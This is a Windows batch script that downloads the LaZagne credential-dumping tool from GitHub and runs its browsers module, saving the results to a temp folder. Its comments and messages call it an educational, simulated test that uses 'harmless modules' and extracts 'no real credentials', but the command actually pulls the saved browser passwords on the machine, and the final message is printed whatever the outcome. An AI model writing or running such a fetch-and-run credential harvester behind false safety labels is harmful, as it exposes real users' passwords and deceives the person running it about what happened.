@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Settings (Local Testing Only)
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne_Test.exe"  :: Renamed to avoid confusion
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"

echo ------------------------------------------------------------
echo [INFO] Educational Test Script (Local VM Only)
echo ------------------------------------------------------------

:: 1. Download LaZagne (if not present)
echo [1/4] Checking LaZagne...
if not exist "%LAZAGNE_EXE%" (
    echo   Downloading for testing...
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
    if errorlevel 1 (
        echo   [ERROR] Download failed (check VM internet).
        exit /b 1
    )
    echo   [OK] Downloaded (for educational use).
) else (
    echo   [INFO] Already present (test file).
)

:: 2. Close Chrome (simulated)
echo [2/4] Simulating browser closure...
tasklist | find /i "chrome.exe" >nul
if %errorlevel% == 0 (
    echo   [SIMULATION] Chrome would be closed in a real test.
) else (
    echo   [INFO] Chrome not running (simulated check).
)

:: 3. Create output directory
echo [3/4] Creating test output...
if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" 2>nul || (
        echo   [ERROR] Failed to create dir.
        exit /b 1
    )
)
echo   [OK] Output dir: %OUTPUT_DIR%

:: 4. Run LaZagne (but limit to harmless modules)
echo [4/4] Running in TEST MODE (no real credentials)...
"%LAZAGNE_EXE%" browsers -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 (
    echo   [ERROR] Test run failed.
    exit /b 1
)

:: Show dummy results (no real data)
echo [INFO] Test completed. No real credentials extracted.
echo       Check %OUTPUT_DIR% for educational output.
echo ------------------------------------------------------------
pause
